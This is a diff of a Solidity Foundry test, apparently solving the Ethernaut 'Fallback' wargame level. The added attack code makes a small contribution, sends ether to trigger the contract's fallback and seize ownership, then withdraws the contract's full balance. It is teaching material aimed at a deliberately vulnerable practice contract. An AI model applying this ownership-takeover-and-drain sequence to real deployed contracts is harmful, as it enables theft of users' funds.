@@ -14,10 +14,11 @@ contract FallbackTest is DSTest {
         // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
         // Deal EOA address some ether
-        vm.deal(eoaAddress, 5 ether);
+        // vm.deal(eoaAddress, 5 ether);
     }
 
     function testFallbackHack() public {
+        vm.deal(eoaAddress, 5 ether);
         /////////////////
         // LEVEL SETUP //
         /////////////////
@@ -30,6 +31,27 @@ contract FallbackTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+
+        // add a contribution
+
+        ethernautFallback.contribute{value: 1 wei}();
+        assertEq(ethernautFallback.getContribution(), 1 wei);
+
+        emit log_named_uint("balance of player: ", eoaAddress.balance);
+        // send ether to contract to take ownership
+        payable(address(ethernautFallback)).call{value: 1 wei}("");
+        assertEq(ethernautFallback.owner(), eoaAddress);
+
+        // withdraw teh balance
+        emit log_named_uint(
+            "Fallback balance: ",
+            address(ethernautFallback).balance
+        );
+        ethernautFallback.withdraw();
+        emit log_named_uint(
+            "Fallback balance: ",
+            address(ethernautFallback).balance
+        );
 
         //////////////////////
         // LEVEL SUBMISSION //
